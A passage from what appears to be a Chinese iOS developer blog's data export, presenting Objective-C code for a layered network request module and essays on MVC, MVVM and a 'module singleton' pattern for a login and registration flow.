API_VerifyCode APIFormat(API_Login_Head, API_Version, @&quot;verifyCode&quot;) //验证码 #define API_Login_ByPassword APIFormat(API_Login_Head, API_Version, @&quot;password&quot;) //密码登录 #endif //API_NETCONFIGURE_H RequestCore层RequestCore层是实际执行网络请求部分,其构造取决于你使用那种设计,可以基于AFNetworking或者源生的URLConnection等.其核心思想如下 RequestCore本身是个全局单例 RequestCore负责添加公共参数 RequestCore负责生成URLRequest RequestCore负责发送URLRequest 由于AFNetworking2.0本身就是一个单例,且内部完成以上3-4条,所以可以继承于 @interface NetRequestCore : AFHTTPRequestOperationManager 下面我们来使用源生代码自己实现 RequestCore.htypedef NS_ENUM(NSInteger, ParametersEncoding) &#123; ParametersEncodingUrl = 0, ParametersEncodingJSON &#125;; typedef void(^FailureBlock)(NSError *error); typedef void(^SuccessBlock)(NSData *responseData); @interface RequestCore : NSObject @property (nonatomic, strong, readonly) NSURL *baseUrl; #pragma mark - Core Instance + (instancetype)shareInstance; #pragma mark - NSURLRequest - (NSMutableURLRequest *)requestWithMethod:(NSString *)method path:(NSString *)path parameters:(NSDictionary *)parameters ParametersEncoding:(ParametersEncoding)encoding; #pragma mark - NSURLConnection - (void)sendReqeust:(NSURLRequest *)request success:(SuccessBlock)success failure:(FailureBlock)failure; #pragma mark - GET - (void)get:(NSString *)path parameters:(NSDictionary *)parameters success:(SuccessBlock)success failure:(FailureBlock)failure; #pragma mark - POST - (void)post:(NSString *)path withJsonParameters:(NSDictionary *)parameters success:(SuccessBlock)success failure:(FailureBlock)failure; - (void)post:(NSString *)path withUrlParameters:(NSDictionary *)parameters success:(SuccessBlock)success failure:(FailureBlock)failure; @end RequestCore.m#import &quot;RequestCore.h&quot; #import &quot;APIConfigureHeader.h&quot; @implementation RequestCore #pragma mark - Core Instance + (instancetype)shareInstance &#123; static RequestCore *_shareInstance = nil; static dispatch_once_t onceToken; dispatch_once(&amp;onceToken, ^&#123; _shareInstance = [[RequestCore alloc] init]; &#125;); return _shareInstance; &#125; - (instancetype)init &#123; if (self = [super init]) &#123; _baseUrl = [NSURL URLWithString:API_BaseUrl]; &#125; return self; &#125; #pragma mark - Core Tool + (NSMutableDictionary *)commonParams &#123; NSMutableDictionary *commonParams = [NSMutableDictionary dictionary]; commonParams[@&quot;systemType&quot;] = @&quot;ios&quot;; //系统类型 commonParams[@&quot;deviceName&quot;] = @&quot;John&quot;; //终端名称 return commonParams; &#125; + (NSMutableDictionary *)appendInfo:(NSDictionary *)params &#123; NSMutableDictionary *newParams = [[self class] commonParams]; for (NSString *key in [params allKeys]) &#123; newParams[key] = params[key]; &#125; return newParams; &#125; - (NSURL *)encodeUrlWithPath:(NSString *)path &#123; NSString *urlString = [[NSURL URLWithString:path relativeToURL:_baseUrl] absoluteString]; NSString *utf8String = [urlString stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding]; return [NSURL URLWithString:utf8String]; &#125; #pragma mark - NSURLRequest - (NSMutableURLRequest *)requestWithMethod:(NSString *)method path:(NSString *)path parameters:(NSDictionary *)parameters ParametersEncoding:(ParametersEncoding)encoding &#123; NSURL *URL = [self encodeUrlWithPath:path]; NSMutableURLRequest *request = [[NSMutableURLRequest alloc] initWithURL:URL cachePolicy:NSURLRequestUseProtocolCachePolicy timeoutInterval:30]; request.HTTPMethod = method; if (parameters) &#123; //Get if ([method isEqualToString:@&quot;GET&quot;] || [method isEqualToString:@&quot;HEAD&quot;] || [method isEqualToString:@&quot;DELETE&quot;]) &#123; NSMutableArray *array = [NSMutableArray array]; for (NSString *key in parameters.allKeys) &#123; NSString *string = [NSString stringWithFormat:@&quot;%@=%@&quot;, key, parameters[key]]; [array addObject:string]; &#125; NSString *bodyStr = [array componentsJoinedByString:@&quot;&amp;&quot;]; NSString *urlWithGetParameters = [[URL absoluteString] stringByAppendingFormat:[path rangeOfString:@&quot;?&quot;].location == NSNotFound ? @&quot;?%@&quot; : @&quot;&amp;%@&quot;, bodyStr]; request.URL = [NSURL URLWithString:urlWithGetParameters]; &#125; else &#123; //POST switch (encoding) &#123; case ParametersEncodingUrl:&#123; [request setValue:@&quot;application/x-www-form-urlencoded; charset=UTF-8&quot; forHTTPHeaderField:@&quot;Content-Type&quot;]; NSMutableArray *array = [NSMutableArray array]; for (NSString *key in parameters.allKeys) &#123; NSString *string = [NSString stringWithFormat:@&quot;%@=%@&quot;, key, parameters[key]]; [array addObject:string]; &#125; NSString *bodyStr = [array componentsJoinedByString:@&quot;&amp;&quot;]; NSData *bodyData = [bodyStr dataUsingEncoding:NSUTF8StringEncoding]; request.HTTPBody = bodyData; break; &#125; case ParametersEncodingJSON:&#123; [request setValue:@&quot;application/json;charset=UTF-8&quot; forHTTPHeaderField:@&quot;Content-Type&quot;]; NSData *data = [NSJSONSerialization dataWithJSONObject:parameters options:kNilOptions error:nil]; request.HTTPBody = data; break; &#125; default: break; &#125; &#125; &#125; return request; &#125; #pragma mark - NSURLConnection - (void)sendReqeust:(NSURLRequest *)request success:(SuccessBlock)success failure:(FailureBlock)failure&#123; NSOperationQueue *queue = [NSOperationQueue mainQueue]; [NSURLConnection sendAsynchronousRequest:request queue:queue completionHandler:^(NSURLResponse *response, NSData *data, NSError *connectionError) &#123; if (connectionError) &#123; // NSLog(@&quot;connectionError = %@&quot;, connectionError); if (failure) &#123; failure(connectionError); &#125; &#125; else &#123; NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)response; NSInteger responseCode = [httpResponse statusCode]; // NSLog(@&quot;response %@&quot;, response); // NSLog(@&quot;responseCode %tu&quot;, responseCode); if (responseCode == 200) &#123; if (success) &#123; success(data); &#125; &#125; else &#123; NSError *error = [NSError errorWithDomain:@&quot;NSURLErrorDomain&quot; code:9999 userInfo:@&#123;@&quot;NSLocalizedDescription&quot;:@&quot;接口请求地址或参数错误&quot;&#125;]; if (failure) &#123; failure(error); &#125; &#125; &#125; &#125;]; &#125; #pragma mark - GET - (void)get:(NSString *)path parameters:(NSDictionary *)parameters success:(SuccessBlock)success failure:(FailureBlock)failure &#123; NSMutableURLRequest *request = [self requestWithMethod:@&quot;GET&quot; path:path parameters:parameters ParametersEncoding:ParametersEncodingUrl]; [self sendReqeust:request success:success failure:failure]; &#125; #pragma mark - POST - (void)post:(NSString *)path withJsonParameters:(NSDictionary *)parameters success:(SuccessBlock)success failure:(FailureBlock)failure &#123; NSMutableDictionary *combinedParameters = [[self class] appendInfo:parameters]; NSMutableURLRequest *request = [self requestWithMethod:@&quot;POST&quot; path:path parameters:combinedParameters ParametersEncoding:ParametersEncodingJSON]; [self sendReqeust:request success:success failure:failure]; &#125; - (void)post:(NSString *)path withUrlParameters:(NSDictionary *)parameters success:(SuccessBlock)success failure:(FailureBlock)failure &#123; NSMutableDictionary *combinedParameters = [[self class] appendInfo:parameters]; NSMutableURLRequest *request = [self requestWithMethod:@&quot;POST&quot; path:path parameters:combinedParameters ParametersEncoding:ParametersEncodingUrl]; [self sendReqeust:request success:success failure:failure]; &#125; @end RequestResponse &amp; RequestHadle RequestResponse: 把Service层的数据封装成Model返回 RequestHandle: 用于对不同层的进行数据处理 APIHandle有两个主要功能: 将返回的NSData(一般是JSON串)序列化成词典 将返回的NSError直接返回 ServiceHandle有主要功能 根据API层的返回判断网络请求是否成功 请求成功的情况下把NSData的字典封装成Model RequestResponse.h@interface RequestResponse : NSObject @property (assign, nonatomic) BOOL reqStatus; //请求是否成功 YES成功 NO失败 @property (assign, nonatomic) BOOL reqNetError; //是否物理请求失败 @property (strong, nonatomic) id reqData; //二进制数据 @property (copy, nonatomic) NSString *reqDataStr; //二进制数据字符串 @property (copy, nonatomic) NSString *reqCode; //请求Code @property (copy, nonatomic) NSString *reqMsg; //备注信息 + (instancetype)newResponse; @end RequestResponse.m#import &quot;RequestResponse.h&quot; @implementation RequestResponse + (instancetype)newResponse&#123; return [[self alloc] init]; &#125; - (instancetype)init &#123; self = [super init]; if (self) &#123; _reqDataStr = @&quot;&quot;; _reqCode = @&quot;&quot;; _reqMsg = @&quot;&quot;; &#125; return self; &#125; @end RequestHandle.h#import &quot;RequestResponse.h&quot; @interface RequestHandle : NSObject typedef void (^APIResponseBlock) (id responeObj, NSError *error);//API Block typedef void (^SerResponseBlock) (RequestResponse *response);//Service Block #pragma mark - API Layer Handle + (void)handleAPIResponseData:(NSData *)responseData error:(NSError *)error block:(APIResponseBlock)block; #pragma mark - Service Layer Handle + (void)handleSerResponseObject:(id)responeObj error:(NSError *)error block:(SerResponseBlock)block; @end RequestHandle.m#import &quot;RequestHandle.h&quot; @implementation RequestHandle #pragma mark - API Layer Handle + (void)handleAPIResponseData:(NSData *)responseData error:(NSError *)error block:(APIResponseBlock)block&#123; if (block) &#123; if (error) &#123; block(nil, error); &#125; else &#123; NSDictionary *retDic = [self getObjectFromJSONData:responseData]; block(retDic, nil); &#125; &#125; &#125; #pragma mark - Service Layer Handle + (void)handleSerResponseObject:(id)responeObj error:(NSError *)error block:(SerResponseBlock)block&#123; RequestResponse *response = [RequestResponse newResponse]; //Convert APILayer NSData&#39;s Dictionary To RequestResponse Model if (error) &#123; //Request Failure NSLog(@&quot;=== 网络请求失败 === %@ ===&quot;, [error localizedDescription]); response.reqStatus = NO; &#125; else &#123; //Request Success response.reqStatus = [responeObj[@&quot;successKey&quot;] boolValue]; response.reqCode = responeObj[@&quot;errorCodeKey&quot;]; response.reqMsg = responeObj[@&quot;errorMsgKey&quot;]; response.reqData = responeObj; response.reqDataStr = [self getJSONStringFromObject:responeObj]; &#125; if (block) &#123; //Block Response Model block(response); &#125; &#125; #pragma mark - Handle Tools //This Function Can Be Write In NSData&#39;s Custom Category + (id)getObjectFromJSONData:(NSData *)data &#123; NSError *error = nil; id object = [NSJSONSerialization JSONObjectWithData:data options:kNilOptions error:&amp;error]; if (error) &#123; return nil; &#125; else &#123; return object; &#125; &#125; //This Function Can Be Write In NSObject&#39;s Custom Category + (NSString *)getJSONStringFromObject:(id)Object&#123; if (![NSJSONSerialization isValidJSONObject:Object]) &#123; return nil; &#125; NSError *error = nil; NSData *data = [NSJSONSerialization dataWithJSONObject:Object options:kNilOptions error:&amp;error]; if (error) &#123; return nil; &#125; else &#123; NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding]; return string; &#125; &#125; @end API层API层的职能: 接收从服务层传来的纯字符串数据 确定请求的地址URL,并且把参数进行组装序列化 执行RequestCore层核心请求代码 ReqAPI.h#import &lt;Foundation/Foundation.h&gt; #import &quot;RequestHandle.h&quot; @interface ReqAPI : NSObject typedef NS_ENUM(NSInteger, PhoneAuthCodeType) &#123; PhoneAuthCodeTypeLogin = 1, //登陆短信 PhoneAuthCodeTypeOpenAccount = 2, //开户申请短信 &#125;; #pragma mark - Verify Code + (void)reqSendPhoneAuthCodeWithProductNo:(NSString *)productNo type:(PhoneAuthCodeType)type block:(APIResponseBlock)block; @end ReqAPI.m#import &quot;ReqAPI.h&quot; #import &quot;APIConfigureHeader.h&quot; #import &quot;RequestCore.h&quot; @implementation ReqAPI #pragma mark - Verify Code + (void)reqSendPhoneAuthCodeWithProductNo:(NSString *)productNo type:(PhoneAuthCodeType)type block:(APIResponseBlock)block&#123; //Combine Parameters NSMutableDictionary *params = [NSMutableDictionary dictionary]; params[@&quot;productNo&quot;] = productNo; params[@&quot;businessType&quot;] = [NSString stringWithFormat:@&quot;%ld&quot;,(long)type]; //Launch Request [[RequestCore shareInstance] post:API_VerifyCode withJsonParameters:params success:^(NSData *responseData) &#123; [RequestHandle handleAPIResponseData:responseData error:nil block:block]; &#125; failure:^(NSError *error) &#123; [RequestHandle handleAPIResponseData:nil error:error block:block]; &#125;]; &#125; @end Service层Service层职能: 直接对外提供网络服务 对用户传入的数据以及对全局数据进行路由 对数据进行字符串化加解密等简单处理 执行API层函数 用户只需要传入参数,就可得到返回的模型RequestResponse ReqService.h#import &quot;ReqAPI.h&quot; @interface ReqService : NSObject #pragma mark - Verify Code + (void)sendPhoneAuthCodeWithProductNo:(NSString *)productNo type:(PhoneAuthCodeType)type block:(SerResponseBlock)block; @end ReqService.m@implementation ReqService #pragma mark - Verify Code + (void)sendPhoneAuthCodeWithProductNo:(NSString *)productNo type:(PhoneAuthCodeType)type block:(SerResponseBlock)block&#123; [ReqAPI reqSendPhoneAuthCodeWithProductNo:productNo type:type block:^(id responseObj, NSError *error) &#123; [RequestHandle handleSerResponseObject:responseObj error:error block:block]; &#125;]; &#125; @end ReqAPI+Category &amp; ReqService+Category除了公共请求以外,不同模块的请求可以使用Category来管理,这样的好处有以下几点 所有接口都可以使用ReService调用,代码维护成本低 根据模块API层与Service层一一对应,方便管理 根据网络模块接口设计原则,API层和Service层本身并不存在实例化,全部通过类函数实现 API层的LoginCategory//ReqAPI+Login.h + (void)reqLoginByPwd:(NSString *)productNo loginPwd:(NSString *)loginPwd block:(APIResponseBlock)block; //ReqAPI+Login.m + (void)reqLoginByPwd:(NSString *)productNo loginPwd:(NSString *)loginPwd block:(APIResponseBlock)block &#123; //Combine Parameters NSMutableDictionary *params = [NSMutableDictionary dictionary]; params[@&quot;productNo&quot;] = productNo; params[@&quot;password&quot;] = loginPwd; //Launch Request [[RequestCore shareInstance] post:API_Login_ByPassword withJsonParameters:params success:^(NSData *responseData) &#123; [RequestHandle handleAPIResponseData:responseData error:nil block:block]; &#125; failure:^(NSError *error) &#123; [RequestHandle handleAPIResponseData:nil error:error block:block]; &#125;]; &#125; Service层的LoginCategory//ReqService+Login.h + (void)loginByPwd:(NSString *)productNo loginPwd:(NSString *)loginPwd block:(SerResponseBlock)block; //ReqService+Login.m + (void)loginByPwd:(NSString *)productNo loginPwd:(NSString *)loginPwd block:(SerResponseBlock)block &#123; [ReqAPI reqLoginByPwd:productNo loginPwd:loginPwd block:^(id responseObj, NSError *error) &#123; [RequestHandle handleSerResponseObject:responseObj error:error block:block]; &#125;]; &#125;","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Architecture","slug":"Architecture","permalink":"http://yoursite.com/tags/Architecture/"},{"name":"Net","slug":"Net","permalink":"http://yoursite.com/tags/Net/"}]},{"title":"设计模式的思考(一):MVC","date":"2016-02-13T15:00:00.000Z","path":"2016/02/14/设计模式的思考MVC/","text":"MVC模式是什么MVC全称Model-View-Controller Model:用于管理数据 View:用于展示数据 Controller:用于管理事件 根据唐巧的文章介绍,MVC的概念最早出现在二十世纪八十年代的施乐帕克实验室中,就是传说中乔布斯抄袭的那个实验室。其本质是尽量高复用View和Model. View: 你如果抽象得好，那么一个 App 的动画效果可以很方便地移植到别的 App 上 Model: 用来存储业务的数据的，如果做得好，它也可以方便地复用。 Controller: 因为一个界面逻辑对应一个Controller,所以很难被复用 当意识到Controller很难被复用,那么设计的理念就清晰了,容易或者说需要复用的放入View和Model,Controller里尽量不要放需要复用的代码,因为Controller本身不便于复用. Xcode中的MFC根据苹果推荐的MFC建立方法 Model: Xcode并没有推荐的,一般使用自建一个基于NSObject的类来当作Model View: Xcode推荐使用的View是xib和Storyboard,两者实质是XML文件 Controller: Xcode最常见的就是ViewController类,用于控制View文件的声明周期和事件 在Xcode推荐的方式里,一般使用@IBOutlet进行关联View和Controller.但是由于好多人不喜欢使用xib和Storyboard来书写View,加上遇到批量更改或者同一管理时,使用代码更加方便,所以导致实际情况是View的内容和ViewController的内容混合在了一起. Xcode中Model的常用方法由于Model是自建的一个NSObject类,一般使用属性来保存数据 @property (nonatomic, copy) NSString *theme; 然后会自定义以下方法用于模型的初始化 - (instancetype)initWithDict:(NSDictionary *)dict; + (instancetype)createWithDict:(NSDictionary *)dict; 第一个方法是通过字典初始化模型的实例方法 - (instancetype)initWithDict:(NSDictionary *)dict &#123; self = [super init]; if (self) &#123; self.theme = [dict valueForKey:@&quot;THEME&quot;]; &#125; return self; &#125; 第二个是使用字典初始化模型的类方法 + (instancetype)createWithDict:(NSDictionary *)dict &#123; return [[self alloc]initWithDict:dict]; &#125; 如果需要对模型进行深拷贝,需要实现NSCopy协议 - (id)copyWithZone:(NSZone *)zone &#123; CustomModel *newItem = [[CustomModel allocWithZone:zone] init]; newItem.theme = self.theme; return newItem; &#125; 还可以实现逆转换方法,用于转化成通用的Dictionary或者Array + (NSDictionary *)convertDictFromModel:(CustomModel *)model &#123; NSMutableDictionary *dict = [NSMutableDictionary dictionary]; [dict setValue:model.theme forKey:@&quot;THEME&quot;]; return dict; &#125; View和Controller混合在一起造成的问题由于纯代码完成View造成了ViewController.m这个文件中会有一大部分代码是界面,这部分代码完成了本来应该用Xib和Stroyboard完成的工作,所以代码量的增加,会导致Controller显得特别臃肿,不利于代码Review和审查 为了解决这个问题,才会有人提出了MVVM这个新的的设计模式,以及我目前更喜欢的另外一种模式来解决. MVC的理解MVC的误区我个人对于MVC最早的理解,认为MVC应该是完全分离的,像圈地一样把不同的东西放在不同的地方,甚至认为只要我有独立的数据管理机制,就是Model,所以我把所有界面之间的数据都通过字典和数组储存和传递. MVC误区带来的问题之所以我通过数组和字典进行储存数据和传递,基于的考虑是字典和数组不管在任何界面都是可以被解析的,不用加载一个自己的Class进行解析. 但是这引起了很多问题: NSDictionary和NSArray本身是不可变的,一旦init就不能对其内存进行修改 使用Key-Value键值对调用,很容易写错Key导致数据出错 每个界面都要自己解析Dictionary是什么 虽然以上三个问题都可以通过技术手段避免,但是这明显进入了为了解决一个简单的问题,引入了更复杂问题的怪圈.而最关键的问题是,使用Dictionary会影响到MVC三个模块之间的联动. MVC的核心:联动但是只所以被称为设计模式,其实MVC三个部分之间并不是说要做到去耦合,完全独立的关系.MVC之间应该是一种联动关系,最终为了是通过不同的方式来展示信息(数据),如下图. Model可以作为Controller的一个属性,通过**setModel:**方法进行控制,每当Model数据被Set时就会引起Controller对View的控制 而用户对View的改变,会通过Action作用于Controller,在Action触发的函数里实际改变(Change)Model的数据. 而这一切联动,都是围绕着信息,所以说最终用户和计算机之间交流的本质就是信息. 误区不能联动举例 需求 在完成一个读取本机号码做成TableView的过程中,可以通过点击Cell改变当前对象为选中或非选中状态 问题1: NSDictionary无法改变 由于NSDictionary一旦init就无法改变,所以当根据动作不同改变名为”Selected”的Key值时,无法改变,这个问题可以通过NSMutableDictionary解决,但是还存在问题2 问题2: 无法通过Set函数联动 解决了问题一之后,在滑动TableViewCell,由于存在TableViewCell复用 在第一行被选中,把索引第一的NSMutableDictionary的”Selected”的Key值改变 但是Cell再复用后又从选中后的View样式变回了默认的未选中的View样式 产生的原因是复用出的Cell并没有接受到Selected这个动作. 如果要使用字典和View联动,还需要自己写一套联动方法,并没有直接通过读取自身属性Model的值快.就犯了为了解决一个问题引入另外一个问题的悖论. 结论 综上所述,使用自定义的基于NSObject的Model更利于理解和使用,虽然Array和Dictionary有较好的通用性,但是并不方便.","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Architecture","slug":"Architecture","permalink":"http://yoursite.com/tags/Architecture/"}]},{"title":"设计模式的思考(二):MVVM","date":"2016-02-13T15:00:00.000Z","path":"2016/02/14/设计模式的思考MVVM/","text":"MVVM模式是什么根据唐巧的文章和Objective-C.io介绍,MVVM是最早于2005年被微软的 WPF 和 Silverlight 的架构师 John Gossman 提出,并且应用在微软的软件开发中.当时 MVC 已经被提出了 20 多年了,可见两者出现的年代差别有多大. 下面祭出一张微软大神的手绘图 MVVM的目的是什么在上一篇中MFC模式中提出的问题是,ViewController层过于臃肿,Objective-C.io中提出,使用MVVM可以很好的解决这个问题. MVVM的示例由于我本身并不经常使用MVVM的设计模式,所以并没有很有心得的代码,我们以Objective-C.io中的代码举例 首先定义一个Person@interface Person : NSObject - (instancetype)initwithSalutation:(NSString *)salutation firstName:(NSString *)firstName lastName:(NSString *)lastName birthdate:(NSDate *)birthdate; @property (nonatomic, readonly) NSString *salutation; @property (nonatomic, readonly) NSString *firstName; @property (nonatomic, readonly) NSString *lastName; @property (nonatomic, readonly) NSDate *birthdate; @end MVC中使用一个VC展示它- (void)viewDidLoad &#123; [super viewDidLoad]; if (self.model.salutation.length &gt; 0) &#123; self.nameLabel.text = [NSString stringWithFormat:@&quot;%@ %@ %@&quot;, self.model.salutation, self.model.firstName, self.model.lastName]; &#125; else &#123; self.nameLabel.text = [NSString stringWithFormat:@&quot;%@ %@&quot;, self.model.firstName, self.model.lastName]; &#125; NSDateFormatter *dateFormatter = [[NSDateFormatter alloc] init]; [dateFormatter setDateFormat:@&quot;EEEE MMMM d, yyyy&quot;]; self.birthdateLabel.text = [dateFormatter stringFromDate:model.birthdate]; &#125; MVVM: 创建一个ViewModel像MVC中Format这个逻辑,完全可以脱离VC,从而减少ViewController中的代码逻辑. @interface PersonViewModel : NSObject - (instancetype)initWithPerson:(Person *)person; @property (nonatomic, readonly) Person *person; @property (nonatomic, readonly) NSString *nameText; @property (nonatomic, readonly) NSString *birthdateText; @end Person在ViewModel中是作为一个属性,而ViewModel本身有VC中要展示的数据nameText与birthdateText @implementation PersonViewModel - (instancetype)initWithPerson:(Person *)person &#123; self = [super init]; if (!self) return nil; _person = person; if (person.salutation.length &gt; 0) &#123; _nameText = [NSString stringWithFormat:@&quot;%@ %@ %@&quot;, self.person.salutation, self.person.firstName, self.person.lastName]; &#125; else &#123; _nameText = [NSString stringWithFormat:@&quot;%@ %@&quot;, self.person.firstName, self.person.lastName]; &#125; NSDateFormatter *dateFormatter = [[NSDateFormatter alloc] init]; [dateFormatter setDateFormat:@&quot;EEEE MMMM d, yyyy&quot;]; _birthdateText = [dateFormatter stringFromDate:person.birthdate]; return self; &#125; @end MVVM: 轻量化的ViewController- (void)viewDidLoad &#123; [super viewDidLoad]; self.nameLabel.text = self.viewModel.nameText; self.birthdateLabel.text = self.viewModel.birthdateText; &#125; MVVM模式的实质实质就是用一个新的Model,称之为ViewModel,包含了原本MVC中的Model,然后把对数据的逻辑处理和部分业务逻辑,放入这个Model中.ViewController只负责可视化已经处理完善的数据. MVVM本身也是每一个ViewController对应一个ViewModel,但是对于MVC来讲,其具备了一定性质的ViewModel复用的可能 MVVM的缺点好多人推崇MVVM,但是并不代表它没有缺点,任何设计模式都有缺陷,唐巧提到MVVM的作者 John Gossman 的批评,应该值得注意 第一点：数据绑定使得 Bug 很难被调试。你看到界面异常了，有可能是你 View 的代码有Bug，也可能是 Model 的代码有问题。数据绑定使得一个位置的 Bug 被快速传递到别的位置，要定位原始出问题的地方就变得不那么容易了。 第二点：对于过大的项目，数据绑定需要花费更多的内存。","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Architecture","slug":"Architecture","permalink":"http://yoursite.com/tags/Architecture/"}]},{"title":"设计模式的思考(三):局部单例","date":"2016-02-13T15:00:00.000Z","path":"2016/02/14/设计模式的思考局部单例/","text":"局部单例模式除了上文提到的MVVM模式之外,为了解决纯代码MVC中View和ViewController代码冗余问题,我个人还采取过一种局部单例的设计模式. 整个设计由以下部分组成 Model: 用于管理数据,同MVC ViewController: 兼顾View和Controller功能 View: 一些独立的View,如Cell等 ModuleSingleton: 关键!一个局部单例,负责模块功能和模块数据 基本思想(哲⛢学)任何事物都分型和质 型: 就是看到的东西,程序本身并不需要界面甚至模型,这些都是为了质而存在的 质: 就是事物的本质,程序本身是为了完成一些功能,完成功能需要的条件只是信息 那么型存在的理由是什么呢?也就是为了方便信息交流给人看和使用的.所以说MVC也好,MVVM也好,都没有把功能从Controller里分离出来,每个ViewController.m文件都有自己的功能,各自独立.为了减少Controller层的冗余,并不一定非要把View拆出去,也可以拆除对于用户和程序进行交流不必要的部分,也就是质. 模式分析1. 业务分析第一次实际操作的工作是设计一个支付工具的登录注册模块,首先我们来分析登录模块需要什么: 账户 登录密码 验证码 然后分析注册模块需要用到什么: 账户 验证码 登录密码 支付密码 密保问题 密保答案 身份证 根据以上分析,如果不是计算机,而是一个真实的人,比如我去银行柜台办理开户,我需要告诉柜员我要办理什么业务(登录or注册),然后给他必须提供的信息,然后柜员告诉我办理好了没有.只要我信息提供的足够全,柜员给我的结果应该只有两个,办理好了(YES)或没有办理好(NO). 我们假设这个柜员一次只能办理一个业务(实际上也是这样),你给出信息,执行业务,反馈结果,你给出第二次信息,执行第二个业务,反馈第二次结果,如此循环下去. 2. 模块单例数据池经过业务分析,我们需要建立一个数据池,由于登录和注册有部分可以进行复用,所以我们的数据池包括 账户 验证码 登录密码 支付密码 密保问题 密保答案 身份证 数据池用于从外部接收数据 3. 模块单例业务池所谓业务池,就是我这个模块能干什么.比如登录注册模块,一定会有登录和注册. 4. 模块单例业务逻辑就如同步骤1中分析的,发起业务的我们只关心业务有没有办好,并不关心业务具体需要怎么办,就拿登录来的流程举例 接收账户密码 检查账户是不是正确(比如为一个手机号) 密码是不是符合要求 网络是不是正常 是否有验证码的需求 进行登录 而注册的流程就更为复杂 接收账户密码 检查账户是不是符合规范 登录密码是不是符合规范 支付密码是不是符合规范 密保问题是不是可以正常获取 密保答案是不是符合规范 身份证号是不是符合规范 网络是否正常 进行注册开户 从以上分析结合步骤3中的业务池来看,除去接收账户密码与进行登录/开户注册步骤之外,中间的步骤对于业务请求者应该是封闭的,可以单独在模块内部完成的. 5. 模块单例的成型根据步骤1-4的分析,我们已经可以建立一个脱离了界面,本身就可以完成登录注册功能的模块,这个模块的特性是: 有一个数据池用于接收数据 有一个业务池用于接收指令并反馈 内部可以独立完成当前业务所有功能 单例声明周期可以被控制 这四个特征的1-3已经在前四步分析中进行归纳,第四点可以参考我的单例文章 模块的单例代码解析ModuleSingleton.htypedef void(^ModuleSingletonCompletion)(BOOL success, NSString *code, NSString *message); @interface ModuleSingleton : NSObject #pragma mark - ModuleSingleton Life Controller + (instancetype)sharedInstance;//开启单例 + (void)haltSharedInstance;//关闭单例 #pragma mark - ModuleSingleton Data Manager //数据管理 - (void)cleanDataPool;//清除所有数据 - (void)cleanDataPoolExceptAccount;//清除除去帐号外的数据 #pragma mark - DataPool //数据池 @property (nonatomic, copy) NSString *account; @property (nonatomic, copy) NSString *verifyCode; @property (nonatomic, copy) NSString *loginPassword; @property (nonatomic, copy) NSString *payPassword; @property (nonatomic, copy) NSString *secQuestion; @property (nonatomic, copy) NSString *secAnswer; @property (nonatomic, copy) NSString *IDCardNo; #pragma mark - FunctionPool //方法池 - (void)loginWithPasswordCompletion:(ModuleSingletonCompletion)completion; - (void)registerOpenAccountCompletion:(ModuleSingletonCompletion)completion; @end 代码解析根据头文件可以知道暴露在外的只有方法和数据,这个模块就像一个柜员一样,你只需要告诉它必要的信息就可以,然后下达指令就可以了. 也就是说在ViewController中,界面本身并不和逻辑或者网络层对接,所有的功能都在单例中进行统一的对接管理,ViewController的.m文件只负责可视化的展示和视觉逻辑. 最后啰嗦一遍: 业务逻辑(比如例子中的检查)和网络通讯全部由ModuleSingleton单例处理,ViewController只负责可视化,没有可视化,Module本身也可以完成工作 VC中调用登录代码 [[ModuleSingleton shareInstance] setAccount:@&quot;15010XXXXXX&quot;]; [[ModuleSingleton shareInstance] setLoginPassword:@&quot;**********&quot;]; [[ModuleSingleton shareInstance] loginWithPasswordCompletion:^(BOOL success, NSString *code, NSString *message) &#123; if(success) &#123; &#125;else &#123;&#125; &#125;]; ModuleSingleton.mstatic ModuleSingleton *_sharedInstance = nil; static dispatch_once_t _onceToken; NSString *const CheckPassed = @&quot;CheckPassed&quot;; NSString *const CheckErrorCode = @&quot;-999999&quot;; @implementation ModuleSingleton #pragma mark - ModuleSingleton Life Controller + (instancetype)sharedInstance&#123; dispatch_once(&amp;_onceToken, ^&#123; _sharedInstance = [[BPLoginManager alloc] initSharedInstance]; &#125;); return _sharedInstance; &#125; + (void)haltSharedInstance &#123; if (_sharedInstance) &#123; _sharedInstance = nil; _onceToken = 0; &#125; &#125; - (void)dealloc &#123; NSLog(@&quot;ModuleSingleton SharedInstance Did Halted, Address: %p &quot;,self); &#125; - (instancetype)initSharedInstance &#123; if (_sharedInstance) &#123; return self; &#125; self = [super init]; if (self) &#123; [self cleanDataPool]; &#125; return self; &#125; - (instancetype)init &#123; @throw [NSException exceptionWithName:NSInternalInconsistencyException reason:@&quot;ModuleSingleton must accessed by shareInstance&quot; userInfo:nil]; &#125; #pragma mark - ModuleSingleton Data Manager //数据管理 - (void)cleanDataPool &#123; [self cleanDataPoolWithAccount:YES]; &#125; - (void)cleanDataPoolExceptAccount &#123; [self cleanDataPoolWithAccount:NO]; &#125; - (void)cleanDataPoolWithAccount:(BOOL)withAccount &#123; if(withAccount) &#123; account = @&quot;&quot;; &#125; verifyCode = @&quot;&quot;; loginPassword = @&quot;&quot;; payPassword = @&quot;&quot;; secQuestion = @&quot;&quot;; secAnswer = @&quot;&quot;; IDCardNo = @&quot;&quot;; &#125; #pragma mark - FunctionPool //方法池 - (void)loginWithPasswordCompletion:(ModuleSingletonCompletion)completion &#123; //检查发送数据 NSString *checkResult = [self checkLoginWithPassword]; if (![checkResult isEqualToString:CheckPassed]) &#123; completion(NO,CheckErrorCode,checkResult); return; &#125; //登录的网络层 [NetworkModuleService loginWithAccount:_account loginPassword:_loginPassword verifyCode:_verifycode block:^(ServiceResponse *response) &#123; if (response.isSuccess) &#123; completion(YES,response.code,@&quot;登陆成功&quot;); &#125; else &#123; completion(NO,response.code,response.message); &#125; &#125;]; &#125; - (void)registerOpenAccountCompletion:(ModuleSingletonCompletion)completion &#123; //检查发送数据 NSString *checkResult = [self checkRegisterOpenAccount]; if (![checkResult isEqualToString:CheckPassed]) &#123; completion(NO,CheckErrorCode,checkResult); return; &#125; //注册的网络层 [NetworkModuleService openAccount:_account loginPwd:_loginPassword payPwd:_payPassword idNo:_IDCardNo securityQuestion:_secQuestion securityAnswer:_secAnswer block:^(ServiceResponse *response) &#123; if (response.isSuccess) &#123; 